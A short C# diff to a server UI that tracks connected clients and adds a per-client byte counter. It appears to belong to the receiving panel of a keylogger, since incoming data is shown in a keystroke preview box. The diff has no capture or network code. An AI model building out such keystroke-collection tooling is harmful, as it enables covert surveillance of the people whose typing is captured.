@@ -346,7 +346,7 @@ namespace Server.UI
             item.SubItems.Add(client.IpAddress);
             item.SubItems.Add(client.ConnectedAt.ToString("HH:mm:ss"));
             item.SubItems.Add(client.PacketsReceived.ToString());
-            item.SubItems.Add($"{client.DataLength} bytes");
+            item.SubItems.Add("0");  // Initialize data size as "0" (will update dynamically)
             item.Tag = client.ConnectionId;
 
             lvClients.Items.Add(item);
@@ -377,13 +377,19 @@ namespace Server.UI
             txtKeystrokePreview.AppendText(data);
             txtKeystrokePreview.ScrollToCaret();
 
-
+            // Update client statistics in ListView
             foreach (ListViewItem item in lvClients.Items)
             {
                 if (item.Tag != null && (int)item.Tag == connectionId)
                 {
+                    // Update packets count
                     int packets = int.Parse(item.SubItems[3].Text) + 1;
                     item.SubItems[3].Text = packets.ToString();
+                    
+                    // Update data size (bytes)
+                    int currentSize = int.Parse(item.SubItems[4].Text);
+                    int newSize = currentSize + data.Length;
+                    item.SubItems[4].Text = newSize.ToString();
                     break;
                 }
             }
